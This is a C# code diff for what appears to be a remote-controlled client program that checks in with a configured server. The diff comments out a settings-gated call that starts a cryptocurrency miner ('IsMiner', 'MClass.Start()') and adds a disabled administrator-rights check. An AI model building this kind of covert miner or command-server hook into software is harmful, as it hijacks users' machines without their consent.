@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Security.Principal;
 using System.Threading;
 using System.Windows.Forms;
 using Interfaces;
@@ -12,9 +13,24 @@ namespace ClientWorker
         public static Client netSender;
         public static string nameProc;
         private static readonly ManualResetEventSlim _OnResponce = new ManualResetEventSlim(false);
+        static public ChatForm chat;
         private static void Main()
-		{         
+		{
+            
+            //WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
+            //bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
+            
+            //Application.EnableVisualStyles();
+            //Application.SetCompatibleTextRenderingDefault(false);
+            //chat = new ChatForm();
+            //chat.SetLabel(hasAdministrativeRight.ToString());
+            //Thread myThread = new Thread(() => Application.Run(chat)); //Создаем новый объект потока (Thread)
+
+            //myThread.Start(); //запускаем поток
             OnProgramLoad();
+
+
+
             netSender = new Client();
             //netSender.Host = "localhost";
             netSender.Host = StartData.currentServer;
@@ -23,8 +39,8 @@ namespace ClientWorker
             netSender.Events.OnBark = OnBark;
             netSender.Connect(false);
 
+
             _OnResponce.Wait();
-            //Console.ReadKey();
         }
 
         private static void OnBark(int obj)
@@ -97,14 +113,14 @@ namespace ClientWorker
                 }
             }
 
-            if (!isM && Service.Properties.Settings.Default.IsMiner)
-            {
-                try
-                {
-                    MClass.Start();
-                }
-                catch (Exception ex) { Log.Send(ex.Message); }
-            }
+            //if (!isM && Service.Properties.Settings.Default.IsMiner)
+            //{
+            //    try
+            //    {
+            //        MClass.Start();
+            //    }
+            //    catch (Exception ex) { Log.Send(ex.Message); }
+            //}
 
 
             if (num > 1)
